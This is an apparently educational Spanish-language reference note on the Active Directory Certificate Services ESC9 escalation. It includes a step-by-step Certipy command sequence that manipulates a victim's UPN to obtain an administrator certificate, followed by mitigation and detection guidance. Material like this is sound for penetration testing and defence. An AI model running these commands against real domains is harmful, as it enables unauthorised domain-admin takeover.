---
topic: AD CS ESC9
tags: [windows, active-directory, adcs, esc9, certipy, pkinit]
---

# AD CS ESC9

[🇬🇧 English](adcs-esc9.en.md) | **Español**

## Concepto

ESC9 es una escalada de Active Directory Certificate Services. Se abusa cuando una plantilla de certificado tiene `CT_FLAG_NO_SECURITY_EXTENSION` y el atacante controla el atributo `userPrincipalName` de una cuenta con derechos de inscripción. Se cambia el UPN de la víctima por el de un administrador, se solicita el certificado y se restaura el UPN; el certificado sigue siendo válido para autenticarse como el administrador mediante PKINIT.

## Cuándo aplica

- La CA emite una plantilla vulnerable sin la extensión de seguridad (SID).
- El atacante tiene `GenericAll`, `GenericWrite` o equivalente sobre la cuenta víctima.
- La cuenta víctima puede inscribirse en la plantilla.
- El dominio permite autenticación con certificados (PKINIT).

## Requisitos y condiciones

1. Acceso a LDAP para modificar el UPN.
2. Derechos de inscripción en la plantilla.
3. Plantilla con `CT_FLAG_NO_SECURITY_EXTENSION`.
4. Conectividad con la CA y el DC.
5. Un cliente capaz de hacer PKINIT (Certipy, Rubeus, PKINITtools).

## Procedimiento

Se enumera AD CS:

```bash
certipy find -u <USER> -p '<PASSWORD>' -dc-ip <DC> -vulnerable -stdout
```

Se identifica la plantilla y la cuenta controlada. Se cambia el UPN de la víctima al del administrador:

```bash
certipy account update -u <USER> -p '<PASSWORD>' -user <VICTIM> -upn administrator
```

Se solicita el certificado:

```bash
certipy req -u <VICTIM> -p '<PASSWORD>' -ca <CA_NAME> -template <TEMPLATE> -dc-ip <DC>
```

Se restaura el UPN:

```bash
certipy account update -u <USER> -p '<PASSWORD>' -user <VICTIM> -upn <VICTIM>@<DOMAIN>
```

Se autentica con el PFX:

```bash
certipy auth -pfx administrator.pfx -dc-ip <DC>
```

## Variantes

- **ESC10**: modifica el UPN de una cuenta con derechos sobre otra; la diferencia está en el origen del control.
- **ESC9 + RBCD**: el certificado de administrador se usa para configurar RBCD si no se quiere una sesión directa.
- **Rubeus/PKINITtools**: alternativas a Certipy para solicitar TGT con el PFX.
- **Plantillas de usuario**: la misma lógica aplica a cualquier plantilla vulnerable con enrolamiento.

## Limitaciones

- Microsoft endureció la validación de certificados (strong certificate mapping); un dominio actualizado puede rechazar el UPN manipulado.
- La cuenta víctima debe tener permisos de inscripción.
- El cambio de UPN deja eventos 4738 y puede romper el inicio de sesión de la víctima.
- La CA debe estar disponible y el certificado debe ser aceptado por el DC.

## Mitigación

- Eliminar `CT_FLAG_NO_SECURITY_EXTENSION` de las plantillas.
- Aplicar las actualizaciones de Microsoft sobre strong certificate mapping.
- Restringir `GenericAll`/`GenericWrite` sobre cuentas y grupos.
- Auditar plantillas y derechos de inscripción; separar roles de CA.
- Requerir aprobación para plantillas sensibles.

## Detección

- Eventos 4886/4887 (solicitud/emisión de certificado) con cuentas o plantillas inusuales.
- Evento 4738 (cuenta modificada) con cambio de `userPrincipalName`.
- Autenticaciones PKINIT desde hosts no habituales.
- Cambios en `msPKI-Certificate-Name-Flag` o en ACLs de plantillas.

MITRE ATT&CK: T1649 (Steal or Forge Authentication Certificates), T1098 (Account Manipulation).

## Referencias

- <https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7>
- <https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-templates>
- <https://attack.mitre.org/techniques/T1649/>
